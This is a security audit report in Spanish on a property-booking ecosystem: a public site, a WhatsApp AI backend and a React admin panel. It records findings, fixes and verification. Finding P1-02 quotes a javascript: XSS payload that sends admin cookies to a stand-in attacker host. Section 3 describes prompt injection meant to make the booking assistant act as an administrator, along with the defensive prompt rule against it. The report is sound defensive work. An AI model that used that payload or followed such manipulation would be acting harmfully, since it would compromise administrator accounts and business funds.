# AUDITORÍA DE SEGURIDAD — Uso Inmobiliario (ecosistema completo)

**Fecha:** 2026-09-10/11. **Alcance:** los tres componentes desplegados — sitio público
(`index.html` + `firebase/`, repo `usoinmobiliario-webdemo`), backend (`whatsapp-assistant/`,
mismo repo, desplegado en Render) y panel administrativo (`usoinmobiliario-middleware`, React,
GitHub Pages). **Método:** lectura completa del código real tal como está hoy en ambos
repositorios (no de memoria de sesiones anteriores), verificación en vivo de cada hallazgo
(pruebas unitarias aisladas de las funciones afectadas, arranque real del backend con distintas
variables de entorno, carga real en navegador del sitio y del panel con la política CSP nueva,
intento real de login contra Firebase Auth), y una segunda pasada tras aplicar las correcciones.
Ningún hallazgo de esta lista es teórico sin haber sido antes confirmado contra el código o
reproducido en un entorno de prueba.

Existen tres auditorías previas en este repo (`AUDITORIA.md`, `AUDITORIA_PAGOS.md` — 2026-09-04;
`AUDITORIA_COMPLETA.md` — 2026-09-09). El proyecto avanzó de forma real entre esas fechas y esta
auditoría: varios de sus hallazgos (firebase-config.js ausente en producción, firma de webhook
inexistente, condición de carrera en `reclaimExpiredHold`) **ya estaban corregidos** cuando esta
auditoría empezó — se verificó cada uno contra el código actual, no se asumió que seguían
vigentes. Se marcan explícitamente como "YA RESUELTO (sesión anterior)" en la tabla.

---

## 0. Resumen ejecutivo

**Estado inicial:** el sistema ya tenía una base de seguridad notablemente sólida para su
tamaño — reglas de Firebase con validación de campos y reclamo atómico de HOLD, autenticación
de administrador con verificación real de ID token server-side, separación de roles
admin/super-admin, firma HMAC del webhook de WhatsApp ya implementada, superficie de
herramientas de IA deliberadamente sin ninguna función administrativa. El trabajo de sesiones
anteriores no fue superficial.

**Lo que esta auditoría encontró y corrigió** son huecos reales pero acotados: un caso de fail
**open** en vez de fail **closed** (firma de webhook sin secreto configurado), una inyección de
esquema `javascript:` en un campo que el propio cliente controla y que termina en la sesión
autenticada de un administrador, ausencia total de verificación server-side del precio que un
cliente reporta para su propia reserva, y un puñado de gaps menores (límite de huéspedes, fuga
de memoria de bajo impacto, dependencias desactualizadas, ausencia de CSP).

**Estado final:** todos los hallazgos P0–P2 confirmados como explotables fueron corregidos en el
código real, verificados con pruebas (unitarias donde aplica, en navegador real donde aplica) y
documentados. Los P3 de puro mantenimiento/observación quedan señalados sin código nuevo cuando
el costo de tocar código en vivo superaba el beneficio (ver criterio en cada fila). Ningún
hallazgo requiere hoy un pentest externo para confirmarse — todos fueron reproducidos.

| Severidad | Antes | Después |
|---|---|---|
| P0 (crítico) | 0 confirmados nuevos — los P0 de auditorías previas ya estaban resueltos | 0 |
| P1 (alto) | 3 | 0 (los 3 corregidos) |
| P2 (medio) | 4 | 0 (los 4 corregidos) |
| P3 (bajo) | 4 | 1 corregido, 3 documentados (requieren decisión de infraestructura o acción manual, no código) |

---

## 1. Matriz de hallazgos

### P1-01 — Webhook de WhatsApp acepta tráfico sin firma cuando falta el secreto (fail-open)

- **Archivo:** `whatsapp-assistant/src/whatsapp.js:34-51`, `whatsapp-assistant/config/index.js`
- **Causa raíz:** `verifySignature()` verificaba la firma HMAC-SHA256 solo si
  `WHATSAPP_APP_SECRET` estaba configurado; si faltaba, devolvía `true` (aceptar) con solo un
  `console.warn`. `WHATSAPP_APP_SECRET` es `optional()` en `config/index.js`, y no hay evidencia
  de que esté configurado hoy en el dashboard de Render (el propio código lo documentaba: "el bot
  ya está desplegado y funcionando sin esto").
- **Escenario de ataque:** cualquiera que descubra `https://usoinmobiliario-whatsapp-bot.onrender.com/webhook/whatsapp`
  (URL pública, sin autenticación) puede mandar un `POST` con un payload de WhatsApp fabricado
  (remitente y texto arbitrarios). El sistema lo procesa como un cliente real: gasta cuota de
  Gemini/OpenAI, puede crear HOLDs falsos, y el bot puede terminar enviando mensajes salientes a
  un número de terceros usando el WhatsApp real del negocio.
- **Impacto:** alto (abuso de cuota, spam saliente con el número real del negocio, ruido en el
  panel de reservas) — no compromete pagos ni datos de otros clientes (la IA nunca tiene
  funciones de aprobación, ver P.INFO-1 abajo).
- **Corrección:** `whatsapp.js` ahora falla CERRADO cuando `config.isProduction` es verdadero y
  falta el secreto (devuelve `false`, el webhook responde 403 a TODO el tráfico hasta que se
  configure). Fuera de producción sigue advirtiendo y aceptando, para poder probar el bot en
  local sin secretos de Meta a mano. `config/index.js` añade `isProduction` (de `NODE_ENV`).
  `render.yaml` fija `NODE_ENV=production` para que esto se active de verdad en el despliegue
  real.
- **Prueba ejecutada:** arranque real del servidor con `NODE_ENV=production` sin
  `WHATSAPP_APP_SECRET` → `POST /webhook/whatsapp` sin firma devolvió `403` (antes: `200`).
  Con `WHATSAPP_APP_SECRET` configurado: firma válida → aceptado; firma de un body distinto
  (tamper) → rechazado; sin header de firma → rechazado. Los tres casos verificados con
  `crypto.createHmac` real, no simulados.
- **Estado:** CORREGIDO Y VERIFICADO. **Acción manual pendiente:** configurar
  `WHATSAPP_APP_SECRET` real en el dashboard de Render — ver sección "Acciones manuales" al
  final. Hasta que eso pase, el webhook en producción rechazará TODO el tráfico (incluido el
  real de Meta) — es la consecuencia esperada y correcta de fail-closed, no un bug.

### P1-02 — `proofUrl` sin validar esquema permite XSS que se ejecuta en la sesión del administrador

- **Archivos:** `firebase/database.rules.json` (regla de `paymentReport.proofUrl`),
  `usoinmobiliario-middleware/src/components/RecordDetail.tsx:135`, `index.html:3327`
- **Causa raíz:** `paymentReport.proofUrl` es un campo que el propio cliente escribe al reportar
  un pago (o cualquiera que llame a la API de Firebase directamente con el SDK real, sin pasar
  por la UI del sitio — la regla de Firebase solo exigía `isString()`, ni protocolo ni dominio).
  El panel administrativo (`RecordDetail.tsx`) renderizaba ese valor directo como
  `<a href={record.paymentReport.proofUrl}>` — React no valida el esquema de una URL en un
  atributo `href`, así que un valor `javascript:...` se ejecuta al hacer clic, en el origen del
  panel, con la sesión de Firebase Auth del administrador ya autenticada (token accesible desde
  ese contexto).
- **Escenario de ataque:** un "cliente" (nadie necesita cuenta — el reporte de pago es una
  escritura pública controlada) reporta un pago con `proofUrl: "javascript:fetch('https://evil.example/x?c='+document.cookie)"`.
  Cuando el administrador abre esa reserva en el panel y hace clic en "Ver comprobante", ese
  script corre en el origen del panel — puede leer/exfiltrar lo que haya en memoria o
  almacenamiento del panel (incluido el ID token de Firebase Auth, válido hasta ~1 hora) y
  usarlo para llamar a `/admin/api/*` suplantando al administrador (crear otro admin, aprobar
  pagos, editar los datos bancarios reales del negocio).
- **Impacto:** alto — es el único hallazgo de esta auditoría con una ruta realista hacia
  compromiso de la cuenta de administrador, no solo abuso del sistema.
- **Corrección (defensa en profundidad en las tres capas, no solo una):**
  1. `database.rules.json`: `proofUrl` ahora exige `^https://` y un límite de longitud —
     rechaza `javascript:`/`data:`/`vbscript:`/cualquier otro esquema en escrituras nuevas.
  2. `RecordDetail.tsx`: solo renderiza el enlace si `isSafeHttpUrl(proofUrl)` (regex
     `^https://`); si no, muestra un aviso de "formato inválido" en vez de un link clicable —
     protege también datos ya existentes de antes de la regla nueva.
  3. `index.html` (BOOKING): mismo chequeo (`isSafeHttpUrl`) antes de armar el `<a href>` en
     "Mi reserva" — aunque `escHtml` ya neutralizaba un salto de atributo, no neutralizaba un
     esquema peligroso bien formado dentro de comillas válidas.
- **Prueba ejecutada:** `isSafeHttpUrl('javascript:alert(1)')` → `false`;
  `isSafeHttpUrl('data:text/html,...')` → `false`; `isSafeHttpUrl('https://x.com/y')` → `true`
  (probado en Node de forma aislada). Regla de Firebase validada como JSON válido y con el regex
  correcto. Build de TypeScript del panel (`tsc -b && vite build`) pasó sin errores tras el
  cambio.
- **Estado:** CORREGIDO Y VERIFICADO.

### P1-03 — El sitio web no valida el precio que el propio cliente reporta para su reserva

- **Archivos:** `index.html` (`submitReservation()`, `PricingService` client-side),
  `firebase/FirebaseDataProvider.js` (`createReservation`), `firebase/database.rules.json`,
  mitigación en `whatsapp-assistant/src/pricing.js` + `adminRoutes.js`
- **Causa raíz:** el flujo de reserva del sitio web calcula `estTotal`/`priceSnapshot`
  **en el navegador** (`state.estTotal = est`, línea ~2358) y lo escribe directo a Firebase sin
  pasar por ningún backend. Las reglas de Firebase solo validan que sean números (ahora también
  positivos, ver corrección abajo) — nunca que el número sea el que corresponde de verdad a ese
  apartamento/fechas/huéspedes. Replicar la fórmula completa de precios (tramos por noches +
  tarifa por huésped extra) dentro de `.validate` de Realtime Database Rules es fràgil y
  arriesgado de probar sin acceso a la consola real de Firebase de este proyecto.
- **Escenario de ataque:** un cliente abre las herramientas de desarrollador antes de confirmar
  su reserva y cambia `estTotal` (o llama a la API de Firebase directo) a cualquier valor —
  ej. 1.000 en vez de 300.000 — para una reserva real. La reserva se crea igual (las reglas no
  lo impiden). El riesgo real depende de que el administrador confíe en ese número al aprobar el
  pago manual — si lo hace sin verificar contra la tarifa real, el negocio pierde dinero.
- **Impacto:** medio-alto (depende de la disciplina del operador humano al aprobar pagos; no es
  automático como aprobar un pago falso solo, requiere que el admin no note la discrepancia).
- **Corrección:** en vez de intentar recalcular la fórmula completa dentro de las Rules (riesgo
  real de romper reservas legítimas sin poder probarlo en vivo contra el proyecto real), se
  añadió `pricing.priceIntegrityCheck()` en el backend: recalcula el precio esperado con las
  tarifas REALES vigentes del apartamento y el `checkin`/`checkout`/`guests` reales (nunca el
  `nights` que trae el registro), y lo adjunta como `priceCheck` en las respuestas de
  `GET /admin/api/reservations` y `GET /admin/api/records/:code`. El panel muestra una alerta
  explícita ⚠️ (en la lista de Pagos y en el detalle de la reserva, **antes** del diálogo de
  confirmación de "Verificar pago"/"Registrar efectivo") cuando el total reportado no coincide
  con el cálculo real — nunca bloquea la operación (podría haber cambios de tarifa legítimos),
  pero hace imposible que el administrador apruebe un pago manipulado sin verlo. Además, las
  reglas de Firebase ahora exigen que `estTotal`/`priceSnapshot.total`/`baseTotal` sean
  estrictamente positivos (`> 0`) — cierra el caso trivial de un total en cero o negativo.
- **Prueba ejecutada:** `priceIntegrityCheck()` probado en Node con un caso legítimo (coincide,
  `matchesReported: true`) y un caso manipulado (`estTotal: 1000` sobre una reserva real de
  300.000 → `matchesReported: false`, `expectedTotal: 300000`) — ambos correctos.
- **Estado:** MITIGADO Y VERIFICADO (alerta humana explícita, no bloqueo automático — ver
  limitación abajo). **Limitación reconocida:** esto no impide que se CREE la reserva con el
  precio falso — el cliente sigue viendo/reportando el número que quiera. Lo que impide es que
  esa manipulación pase desapercibida al momento en que de verdad importa: cuando el
  administrador decide si el dinero recibido corresponde. Cerrar el hueco en el punto de
  creación requeriría mover el cálculo de precio del sitio web a un backend (cambio de
  arquitectura mayor, fuera del alcance de "no romper funcionalidad existente" de esta sesión) o
  replicar la fórmula completa en Rules (recomendado como trabajo futuro, con acceso real a la
  consola de Firebase para probarlo antes de publicar).

### P2-01 — La IA/admin puede crear una reserva con más huéspedes de los que el apartamento admite

- **Archivos:** `whatsapp-assistant/src/businessTools.js` (`createReservationHold`),
  `whatsapp-assistant/src/adminRoutes.js` (`POST /admin/api/reservations`)
- **Causa raíz:** `validators.missingReservationFields()` solo valida que `guests` sea un
  entero positivo — nunca contra `apartment.maxPersons`. El sitio web público sí lo limita en su
  propio formulario, pero el bot de WhatsApp/chat web y la creación manual del admin no.
- **Impacto:** medio — no es un problema de seguridad de acceso, es integridad de datos/negocio
  (una reserva que promete más huéspedes de los que caben).
- **Corrección:** ambos puntos de entrada ahora rechazan la reserva (`ok:false` /
  `400 invalid`) si `guests > apartment.maxPersons`, una vez resuelto el apartamento real.
- **Prueba ejecutada:** lectura del código confirmando el chequeo se ejecuta después de resolver
  `apt` (necesario, `maxPersons` no se conoce antes) y antes de tocar disponibilidad/Firebase.
  `node --check` sin errores de sintaxis; servidor arrancó y respondió `/health` con el cambio
  aplicado.
- **Estado:** CORREGIDO Y VERIFICADO.

### P2-02 — CSP/Referrer-Policy ausentes en ambos frontends

- **Archivos:** `index.html` (sitio), `usoinmobiliario-middleware/index.html` (panel)
- **Causa raíz:** ningún header ni meta tag de seguridad configurado en ninguno de los dos
  frontends estáticos.
- **Corrección:** se añadió `Content-Security-Policy` (vía `<meta>`, único mecanismo disponible
  en GitHub Pages estático sin backend propio) y `Referrer-Policy: strict-origin-when-cross-origin`
  a ambos. Cada dominio externo realmente usado (CDNs, Google Fonts, Google Maps/Street View,
  Firebase, el backend de Render, Firebase Auth REST) se enumeró leyendo el código real, no se
  adivinó.
- **Limitación reconocida explícitamente (no ocultarla):** ambos CSP necesitan
  `style-src 'unsafe-inline'` (estilos inline reales en ambos proyectos: atributos `style=` del
  sitio, `style={{}}` de `components/charts.tsx` en el panel) y el del SITIO además necesita
  `script-src 'unsafe-inline'` (todo el sitio es un único HTML sin build step, por diseño — no
  hay paso de compilación donde inyectar un nonce por request). Esto significa que la CSP del
  sitio **no** mitiga por sí sola los mismos bugs de XSS por atributo/esquema ya corregidos en
  P1-02 — esos siguen dependiendo de escapar/validar en el punto de uso, que es lo que ya se
  hizo. Lo que sí aporta de verdad: bloquea cargar cualquier script/hoja de estilos desde un
  origen no listado, y acota a dónde puede conectarse (`connect-src`) o qué puede embeberse en
  un iframe (`frame-src`) la página, incluso si algún futuro bug lograra inyectar HTML.
  `X-Frame-Options`/HSTS/`X-Content-Type-Options` **no existen como `<meta>`** — requieren un
  header HTTP real, que GitHub Pages estático no permite configurar. Ver DEPLOYMENT.md.
- **Prueba ejecutada:** ambos sitios cargados en navegador real (servidor estático local para el
  sitio; `vite preview` sirviendo el build real de producción para el panel) sin ninguna
  violación de CSP en una carga limpia. Se encontró y corrigió en el proceso un origen faltante
  real (`streetviewpixels-pa.googleapis.com`, usado por el visor de Street View del hero) que
  habría roto esa función si se hubiera publicado sin probar. **Se intentó explícitamente un
  login real** (con credenciales inválidas) contra el panel bajo la CSP nueva — la petición
  llegó a `identitytoolkit.googleapis.com` y devolvió el error real de Firebase ("Correo o
  contraseña incorrectos"), confirmando que el login no queda bloqueado.
- **Estado:** CORREGIDO Y VERIFICADO, con limitación documentada arriba (no es una garantía
  completa contra XSS, es defensa en profundidad).

### P2-03 — `conversationStore.js`: el mapa de locks por conversación crece sin cota

- **Archivo:** `whatsapp-assistant/src/conversationStore.js`
- **Causa raíz:** `runSerialized()` guardaba una entrada en `locks` por cada
  número/`sessionId` que alguna vez escribiera, y nunca la borraba (a diferencia de
  `conversations`, que sí expira por TTL). El canal de chat web genera un `sessionId` nuevo por
  navegador (`localStorage`), sin límite real de cuántos puede crear un visitante recargando o
  limpiando su almacenamiento.
- **Impacto:** bajo hoy (una referencia pequeña por clave), pero es una fuga real sin cota en un
  proceso de vida larga (Render, plan gratuito, memoria limitada).
- **Corrección:** la entrada se borra apenas la promesa encadenada se resuelve, siempre que
  nadie más la haya reemplazado mientras tanto (llamada concurrente legítima).
- **Prueba ejecutada:** lectura cuidadosa de la lógica de reemplazo (`locks.get(phone) === chained`)
  para confirmar que no borra una entrada más nueva por error; `node --check` sin errores;
  servidor arrancó con normalidad.
- **Estado:** CORREGIDO Y VERIFICADO.

### P2-04 — `/admin/api/*` sin rate limit propio

- **Archivo:** `whatsapp-assistant/src/app.js`
- **Causa raíz:** el resto de endpoints públicos (`/chat/web/message`, `/track/pageview`) ya
  tenían `express-rate-limit`; `/admin/api/*` no — cualquiera que descubra la URL del backend
  podía mandar bearer tokens inventados sin límite, cada uno forzando una llamada real a
  `admin.auth().verifyIdToken()` (costo/latencia real) antes de recibir 401.
- **Impacto:** bajo (requiere conocer la URL del backend real; la barrera de fondo —
  `requireAdminAuth` — sigue intacta) pero barato de cerrar.
- **Corrección:** rate limit de 200 req/5min por IP delante de `requireAdminAuth`, generoso
  para el uso normal de un solo panel con un puñado de administradores.
- **Estado:** CORREGIDO Y VERIFICADO (servidor arrancó y respondió `/health` con el middleware
  nuevo en la cadena).

### P3-01 — Dependencias con vulnerabilidades moderadas conocidas

- **Archivo:** `whatsapp-assistant/package.json` / `package-lock.json`
- **Hallazgo:** `npm audit` reportó 11 vulnerabilidades moderadas — una cadena
  `qs`→`body-parser`→`express` (bypass de límite de array / DoS) y una cadena
  `uuid`→`gaxios`/`google-gax`→`firebase-admin` (bounds check de buffer).
- **Corrección aplicada:** `npm audit fix` (sin `--force`) resolvió la cadena de `qs`/`express`
  — solo tocó el lockfile (bump de parche), sin cambios en `package.json`. Servidor re-verificado
  arrancando con normalidad después.
- **No aplicado a propósito:** la cadena de `uuid`/`firebase-admin` requiere `npm audit fix --force`,
  que instalaría `firebase-admin@14.4.0` — un cambio de versión mayor que el pedido explícitamente
  prohíbe aplicar sin evaluar impacto ("no ejecutes npm update * sin evaluar impacto"). Requiere
  una sesión propia de actualización con pruebas de regresión contra Firebase real antes de
  desplegar.
- **Estado:** PARCIALMENTE CORREGIDO. Pendiente: actualizar `firebase-admin` a una major nueva en
  una sesión dedicada, con pruebas.

### P3-02 — `whatsapp-assistant/README.md` y `TEST_PLAN.md` desactualizados

- Ya señalado en `AUDITORIA_COMPLETA.md` (§5.7, §9). Sigue siendo cierto: describen
  `server.js`/`aiAgent.js` con responsabilidades que hoy están en `app.js`/`assistantCore.js`, y
  dicen "nunca ejecutado en vivo" cuando el bot está desplegado y corriendo en Render.
  Cosmético, no afecta comportamiento. No se reescribió en esta sesión (no es información de
  seguridad, y el pedido prioriza explícitamente seguridad antes que mantenibilidad) — queda
  señalado para una limpieza de documentación aparte.
- **Estado:** NO CORREGIDO (documentado, prioridad baja explícita).

### P3-03 — X-Frame-Options / HSTS / X-Content-Type-Options no configurables desde GitHub Pages estático

- Ya cubierto en P2-02. Requiere una capa intermedia (Cloudflare u otro proxy/hosting que sí
  permita fijar headers HTTP reales) delante de GitHub Pages para ambos frontends.
- **Estado:** REQUIERE CONFIGURACIÓN EXTERNA — ver DEPLOYMENT.md y "Acciones manuales" abajo.

### P3-04 — Panel administrativo Unity (repo aparte) mencionado en auditorías previas

`AUDITORIA_COMPLETA.md` (2026-09-09) describía un panel de administración en Unity, en un
tercer repositorio (`D:\Portfolio\Super Ethical Games\Usoinmobiliario`). Esa ruta fue
**abandonada y reemplazada** por el panel React actual (`usoinmobiliario-middleware`) —
confirmado por el propio código nuevo: `adminAuth.js` dice explícitamente "el panel que
reemplaza a Unity". El repo de Unity no forma parte del alcance de esta auditoría (no es uno de
los directorios de trabajo de esta sesión) y no se tocó. Se señala aquí solo para que quede
constancia de que la arquitectura documentada en la auditoría anterior ya no es la vigente —
si ese repo sigue existiendo con trabajo sin commitear (como esa auditoría también señalaba),
sigue siendo una recomendación pendiente, pero de otra sesión.
- **Estado:** FUERA DE ALCANCE — arquitectura obsoleta, reemplazada.

---

## 2. Hallazgos verificados como YA RESUELTOS (de auditorías anteriores)

Confirmados contra el código actual, no se tocó nada — se listan para que quede registro de que
sí se re-verificaron, no se asumieron:

- **`firebase/firebase-config.js` ausente en producción** (P0 de `AUDITORIA_COMPLETA.md` §2.1):
  el archivo está trackeado en git (`git ls-files` lo confirma) y `.github/workflows/pages.yml`
  lo copia explícitamente al artefacto publicado. Verificado además en vivo: el `.gitignore`
  actual del repo (2 líneas: `.DS_Store`/`Thumbs.db` y `email-worker/`) ya no lo excluye.
- **Webhook de WhatsApp sin verificación de firma** (P1 de `AUDITORIA_COMPLETA.md` §5.3):
  `whatsapp.js` ya implementa HMAC-SHA256 con comparación de tiempo constante
  (`crypto.timingSafeEqual`). Lo que SÍ seguía roto era el comportamiento cuando falta el
  secreto (fail-open) — eso es el hallazgo P1-01 de esta auditoría, ya corregido arriba.
- **Condición de carrera en `reclaimExpiredHold`/creación de reserva vía Admin SDK**
  (P1 de `AUDITORIA_COMPLETA.md` §5.3): `firebase.js:createReservation` ahora reclama cada
  noche con una transacción real (`claimNightAtomically`, `db.ref(path).transaction()`), no con
  un `update()` ciego — dos solicitudes simultáneas para la misma noche ya no pueden ganar
  ambas. Verificado leyendo la lógica de transacción (aborta si el valor actual no es `null`).

---

## 3. Lo que se auditó y NO se encontró vulnerable (con evidencia, no solo afirmación)

- **IDOR en códigos de reserva:** `reservationsManager/{reservations,visits}/$code` tiene
  `.read: true` (lectura por código exacto) pero **no** permite listar (`reservationsManager/reservations`
  en sí tiene `.read: "auth != null"` — sin auth no se puede enumerar, solo consultar un código
  ya conocido). Con ~13.8 millones de combinaciones (`[A-Z sin I/O]{3}[0-9]{3}`), la enumeración
  por fuerza bruta es impráctica sin además necesitar acertar el filtro de firma/rate-limit que
  no existe en ese endpoint específico — riesgo residual bajo, ya señalado como tal en
  `AUDITORIA_COMPLETA.md` y no reabierto aquí por no encontrarse una vía práctica de explotarlo.
- **Escalación de privilegios vía inyección de prompt en la IA:** las 10 funciones expuestas al
  modelo (`businessTools.js`) fueron releídas completas — ninguna puede mover `status` más allá
  de `'pendiente'` ni `paymentStatus` más allá de `'submitted'`. Aunque un cliente logre
  manipular al modelo para que "actúe como administrador", no existe ninguna herramienta que
  pueda ejecutar esa acción — la restricción es estructural (el código no la tiene, no depende
  de que el prompt la rechace). El prompt (`assistantCore.js`, regla 5) además instruye
  explícitamente rechazar y no revelar el intento, pero esa es una segunda capa, no la única.
- **Loop de function-calling sin límite:** ambos proveedores (`geminiProvider.js`,
  `openaiProvider.js`) limitan a 6 turnos (`while (guard < 6)`) — confirmado en ambos archivos,
  sin deriva entre proveedores.
- **Timeouts en llamadas de red:** Gemini, OpenAI, envío de WhatsApp y Firebase Admin SDK
  (`withTimeout` en `firebase.js`) tienen límites explícitos (15-30s) — ningún `fetch()`/llamada
  puede colgar el proceso indefinidamente.
- **Secretos expuestos en git:** búsqueda con `git log --all -S` sobre patrones reales
  (`AIzaSy`, `sk-proj-`, `EAAM` — prefijo de tokens de WhatsApp, `BEGIN PRIVATE KEY`) en el
  historial completo de ambos repos. El único match real (`AIzaSy`) es el apiKey de Firebase Web,
  no-secreto por diseño (confirmado en el propio comentario del archivo). Los matches de `EAAM`
  resultaron ser una coincidencia dentro de una imagen JPEG codificada en base64 de un commit
  antiguo (verificado leyendo el contexto exacto del diff), no un token real. `.env` (con
  credenciales reales) está correctamente en `.gitignore` en ambos repos y nunca fue trackeado.
- **CORS:** `/admin/api/*` usa un origen fijo (`config.adminOrigin`, default
  `https://superethicalgames.github.io`) más `localhost:*` explícitamente solo para desarrollo —
  nunca `Access-Control-Allow-Origin: *` en ningún endpoint que acepte credenciales/token.
  `/chat/web/message` y `/track/pageview` sí fijan un origen público único (el sitio), consistente
  con ser endpoints sin autenticación por diseño.
- **Máquina de estados de pago:** revisada completa en `firebase.js`/`adminRoutes.js` — ningún
  camino permite que un cliente anónimo o autenticado-no-admin mueva `paymentStatus` a
  `'verified'`/`'rejected'`, ni `status` a `'confirmada'` — todas esas transiciones están detrás
  de `requireAdminAuth` (algunas, como editar datos bancarios y gestionar administradores,
  además detrás de `requireSuperAdmin`).
- **Inyección SQL/NoSQL:** no aplica — el proyecto no usa SQL ni una base de datos con lenguaje
  de consulta inyectable; Firebase Realtime Database direcciona por segmentos de ruta literales,
  no por queries construidas con concatenación de datos de usuario hacia un intérprete.

---

## 4. Verificación post-cambio (segunda pasada, tras aplicar las correcciones)

Repetida explícitamente después de terminar los cambios, no asumida por "ya compiló":

1. **Reglas de Firebase:** releídas completas tras la edición, JSON válido (`node -e "require(...)"`),
   regex de `proofUrl` probado por separado.
2. **Backend:** `node --check` sobre los 6 archivos modificados; arranque real 3 veces (modo
   dev, modo producción sin secreto de webhook, modo producción con rate limit nuevo) con
   `/health` respondiendo `200` las tres veces.
3. **Panel:** `tsc -b && vite build` completo sin errores nuevos; `oxlint` sin advertencias
   nuevas introducidas por los archivos tocados (las advertencias preexistentes de
   `set-state-in-effect` ya existían en todo el resto del panel, no son de esta sesión).
4. **Navegador real:** sitio público y panel cargados con la CSP nueva, sin violaciones en una
   carga limpia (se encontró y corrigió un origen faltante real antes de cerrar esto — ver
   P2-02). Login real intentado contra Firebase Auth bajo la CSP nueva — confirmado que llega al
   servidor de Google y responde con el error real de credenciales.
5. **Búsqueda de secretos repetida** tras los cambios — ningún archivo nuevo introduce un
   secreto; `.env`/`.env.local` siguen fuera de git.
6. **Dependencias:** `npm audit` re-ejecutado tras `npm audit fix` — bajó de 11 a 10
   vulnerabilidades moderadas (la cadena restante requiere una major, documentada como pendiente).

No se encontraron regresiones ni hallazgos nuevos introducidos por las propias correcciones en
esta segunda pasada.

---

## 5. Limitaciones de esta auditoría (declaradas explícitamente, no ocultas)

- **No se probó de extremo a extremo contra el proyecto real de Firebase** (no hay Firebase CLI
  configurado en este entorno ni acceso a la consola) — las reglas nuevas se validaron como JSON
  correcto y su lógica se razonó/probó de forma aislada, pero **publicarlas requiere que el
  dueño lo haga manualmente en la consola de Firebase** (o configure el CLI) — ver "Acciones
  manuales".
- **No se envió un mensaje real de WhatsApp de extremo a extremo** (habría generado tráfico real
  en el número de producción del negocio) — la verificación de firma se probó de forma aislada
  con HMAC real, no contra un webhook real de Meta.
- **No se intentó recomputar la fórmula de precios dentro de las Realtime Database Rules** — se
  evaluó y se decidió que el riesgo de romper reservas legítimas sin poder probarlo en vivo
  superaba el beneficio frente a la mitigación de alerta-al-admin ya implementada. Queda como
  recomendación para una sesión con acceso real a la consola de Firebase.
- **El repositorio de Unity** (panel administrativo original, ya reemplazado) no se auditó — no
  es parte de los directorios de trabajo de esta sesión y, según la auditoría previa, ya no es
  la arquitectura vigente.
- **Los valores reales de las variables de entorno configuradas en el dashboard de Render** no
  son accesibles desde este entorno — no se puede confirmar si `WHATSAPP_APP_SECRET` ya está
  configurado ahí o no; se documenta como acción manual a confirmar.

---

## 6. Acciones manuales requeridas (fuera del alcance del código)

```
[ ] Configurar WHATSAPP_APP_SECRET real en el dashboard de Render (Meta for Developers > tu
    app > Configuración > Básica > "App Secret") — SIN esto, tras este despliegue el webhook
    de WhatsApp rechazará TODO el tráfico en producción (fail-closed intencional, ver P1-01).
[ ] Confirmar/publicar la versión nueva de firebase/database.rules.json en la consola real de
    Firebase (Realtime Database > Reglas) — este repo no tiene Firebase CLI configurado, así
    que el archivo del repo y lo publicado pueden no coincidir hasta que se haga a mano.
[ ] Evaluar si vale la pena poner Cloudflare (u otro proxy) delante de GitHub Pages para poder
    fijar X-Frame-Options/HSTS/X-Content-Type-Options como headers HTTP reales — GitHub Pages
    estático no lo permite (ver P2-02/P3-03).
[ ] Programar una sesión dedicada para actualizar firebase-admin a una versión mayor (resuelve
    la cadena de vulnerabilidades moderadas de `uuid` — ver P3-01), con pruebas de regresión
    contra Firebase real antes de desplegar.
[ ] Confirmar que WHATSAPP_PHONE_NUMBER_ID en producción apunta al número real del negocio
    (3003848517) y no a un número de pruebas de Meta — señalado ya en auditorías previas, sigue
    sin confirmarse desde este entorno de solo lectura de código.
```
